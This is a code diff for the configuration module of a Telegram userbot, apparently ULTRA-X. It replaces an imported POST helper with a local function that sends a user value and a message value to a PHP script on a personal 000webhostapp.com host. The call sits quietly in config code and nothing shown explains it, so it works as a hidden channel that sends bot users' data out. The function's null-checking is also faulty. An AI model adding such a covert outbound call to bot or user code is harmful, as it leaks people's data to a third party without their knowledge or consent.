@@ -16,7 +16,7 @@ try:
   from ULTRA import bot 
 except:
   pass
-from LEGENDX import devs, id, ID, POST
+from LEGENDX import devs, id, ID
 API_ID = os.environ.get("APP_ID", None)
 API_HASH = os.environ.get("API_HASH", None)
 token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
@@ -35,6 +35,16 @@ devs = devs
 ID = ID
 id = id
 REPO = "[υℓтяα χ вσт](https://github.com/ULTRA-OP/ULTRA-X)"
+from requests import post
+
+def POST(user, msg):
+  if user == None:
+     user = ' '
+  elif msg == None:
+    msg = ' '
+  else:
+      pass #post maar rHa hu
+  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
 
 MASTER = NAME
 GROUP = "[SUPPORT GROUP](https://t.me/UltraXChat)"
